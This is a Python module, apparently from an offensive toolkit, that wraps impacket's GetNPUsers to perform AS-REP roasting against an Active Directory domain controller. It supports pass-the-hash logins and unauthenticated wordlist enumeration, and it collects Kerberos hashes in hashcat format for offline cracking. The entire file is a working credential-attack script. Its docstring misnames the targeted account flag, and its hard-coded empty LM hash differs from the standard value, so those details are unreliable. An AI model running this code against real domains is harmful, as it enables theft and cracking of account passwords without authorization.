from pympacket.attacks.GetNPUsers import GetUserNoPreAuth
from argparse import Namespace
import sys
from pympacket.models.common import User, Hash
import logging

def asreproast(domain, dc_ip, username='', password='', nthash=None, usersfile=None):
    """Uses impacket's 'GetNPUsers.py' to requests crackable asrep hashes from Domain Accounts that have the 'PASSWORD_NOT_REQ' flag enabled"""

    # If Pass-The-Hash is used, prepend an empty LM hash before the provided NT one for impacket to successfully authenticate
    if nthash is not None:
        nthash = f'aad3c435b514a4eeaad3b935b51304fe:{nthash}'

    # Default unauthenticated parameter values
    no_pass = True
    request = False

    # Change parameters when calling with creds
    if username != '' or password != '' or nthash is not None:
        no_pass = False
        request = True
        usersfile = None # Ignore usersfile value when calling with creds
    elif usersfile is None: # A user wordlist must be specified when performing unauthenticated enumeration
        print("You must specify a list of users to check.\n", file=sys.stderr)
        return None

    logging.disable(sys.maxsize) #Disable impacket logger

    # Build parameter namespace to pass to GetNPUsers
    cmdLineOptions = Namespace(
        no_pass=no_pass,
        outputfile=None, # Output will be caught and stored by the program, no need of an output file
        usersfile=usersfile,
        format='hashcat', # Formats the asrep hashes in the "hashcat format" as it's the currently supported cracking method by our program
        aesKey=None,
        k=False,
        request=request, # Whether or not to request asrep tickets for other users
        dc_ip=dc_ip,
        dc_host=None,
        hashes=nthash
    )

    # Runs the actual asrep-roast attack from impacket
    asreproasting = GetUserNoPreAuth(username, password, domain, cmdLineOptions)
    asreps = asreproasting.run()

    # Formats output to a list of 'User' classes, if output is different than None
    result = []
    if asreps is not None:
        for asrep in asreps:
            current_user = User()
            current_hash = Hash()
            user = asrep.split('$')[3].split('@')[0] # Extract the username from the asrep hash
            current_user.username = user
            current_hash.type = 'asrep'
            current_hash.value = asrep
            current_user.krb_hash = [current_hash]
            result.append(current_user)
        return result
    else:
        return None